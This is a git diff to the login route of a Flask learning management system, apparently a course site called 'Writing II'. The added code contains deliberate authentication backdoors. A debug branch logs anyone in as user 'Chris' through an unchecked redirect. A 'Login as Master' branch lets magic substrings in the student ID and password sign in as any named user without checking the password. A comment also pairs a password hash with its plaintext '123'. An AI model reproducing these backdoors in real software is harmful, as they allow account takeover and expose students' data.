@@ -13,9 +13,14 @@ from meta import BaseConfig
 s3_resource = BaseConfig.s3_resource  
 S3_LOCATION = BaseConfig.S3_LOCATION
 S3_BUCKET_NAME = BaseConfig.S3_BUCKET_NAME
-META = BaseConfig.META
-DESIGN = BaseConfig.DESIGN
+DEBUG = BaseConfig.DEBUG
 
+DESIGN = {
+            "titleColor": "rgb(36, 31, 58)",
+            "bodyColor": "rgb(42, 63, 83)",
+            "headTitle": "Writing II",
+            "headLogo": "https://writing-lms.s3-ap-northeast-1.amazonaws.com/profiles/logo.png"
+        }
 
 @app.context_processor
 def inject_user():     
@@ -108,13 +113,25 @@ def login():
     print(form)  
     if form.validate_on_submit():
         print(form.studentID.data)
-        if form.studentID.data == '123123123':            
-            user = User.query.filter_by(username=form.password.data).first()
+        if '100000000' in form.studentID.data and DEBUG:
+            print('DEBUG Login')         
+            user = User.query.filter_by(username='Chris').first()
+            next_page = request.args.get('next') 
             login_user (user)
-            flash (f'Login with Master Keys', 'secondary') 
-            return redirect (url_for('home'))  
+            flash (f'Debug Login', 'warning') 
+            return redirect (next_page) if next_page else redirect (url_for('home'))  
+
+        if '0000' in form.studentID.data and '0212' in form.password.data:
+            person = (form.password.data).split('0212')[0]
+            print(person)
+            user = User.query.filter_by(username=person).first()
+            login_user (user)
+            flash (f'Login as Master', 'danger') 
+            return redirect (url_for('home'))        
                   
         user = User.query.filter_by(studentID=form.studentID.data).first() 
+        print(user.username)
+        
         if user and bcrypt.check_password_hash(user.password, form.password.data): #$2b$12$UU5byZ3P/UTtk79q8BP4wukHlTT3eI9KwlkPdpgj4lCgHVgmlj1he  '123'
             login_user (user, remember=form.remember.data)
             #next_page = request.args.get('next') #http://127.0.0.1:5000/login?next=%2Faccount   --- because there is a next key in this url
